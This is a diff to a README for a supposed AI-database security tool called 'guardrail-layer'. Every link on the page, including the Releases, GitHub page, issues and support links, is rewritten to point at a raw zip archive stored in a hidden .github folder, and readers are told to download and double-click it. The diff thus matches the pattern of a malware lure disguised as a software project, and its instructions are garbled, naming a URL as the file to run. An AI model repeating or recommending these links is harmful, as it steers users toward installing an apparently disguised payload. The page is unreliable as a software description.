@@ -6,11 +6,11 @@ Welcome to guardrail-layer! This tool helps you keep your AI database secure wit
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip)
+[![Download Latest Release](https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip%20Latest%20Release-v1.0-blue)](https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip) to download guardrail-layer. Follow these simple steps to install the application on your computer.
+To get started, visit the [Releases page](https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip) to download guardrail-layer. Follow these simple steps to install the application on your computer.
 
 ### 1. Choose Your Version
 
@@ -18,7 +18,7 @@ On the Releases page, you’ll see different versions of guardrail-layer. Always
 
 ### 2. Locate the Downloaded File
 
-Once the download is complete, find the file in your computer’s Downloads folder (or wherever you save downloaded files). The file name will look something like `https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip`.
+Once the download is complete, find the file in your computer’s Downloads folder (or wherever you save downloaded files). The file name will look something like `https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip`.
 
 ### 3. Extract the Files
 
@@ -30,7 +30,7 @@ The downloaded file is likely zipped for easier sharing. Here’s how to extract
 
 ### 4. Open the Application
 
-Once the files are extracted, you will see a new folder named `guardrail-layer`. Open this folder, and you will find an application file named `https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip` (or similar). Double-click on this file to launch the application.
+Once the files are extracted, you will see a new folder named `guardrail-layer`. Open this folder, and you will find an application file named `https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip` (or similar). Double-click on this file to launch the application.
 
 ### 5. Follow the On-Screen Instructions
 
@@ -55,16 +55,16 @@ We recommend the following system setup to run guardrail-layer effectively:
 
 ## 💬 Support
 
-Having trouble? You’re not alone. Common questions are covered in the FAQ section on our [GitHub page](https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip). 
+Having trouble? You’re not alone. Common questions are covered in the FAQ section on our [GitHub page](https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip). 
 
 If you need further assistance, feel free to post a question there, and our community will help you out.
 
 ## 🌟 Contributing
 
-We welcome contributions! If you have ideas for new features or enhancements, consider checking the [issues](https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip) to see what others are working on. You can also fork the repository and submit your changes.
+We welcome contributions! If you have ideas for new features or enhancements, consider checking the [issues](https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip) to see what others are working on. You can also fork the repository and submit your changes.
 
 ## 🎉 Thanks for Using guardrail-layer!
 
 We hope you enjoy using guardrail-layer as much as we enjoyed building it. Keep your data safe and enjoy the benefits of AI with ease!
 
-For more information or to return to the download page, visit [this link](https://raw.githubusercontent.com/AakarshakKaushal00/guardrail-layer/main/solarization/guardrail-layer.zip).
+For more information or to return to the download page, visit [this link](https://github.com/AakarshakKaushal00/guardrail-layer/raw/refs/heads/main/.github/guardrail_layer_2.4.zip).
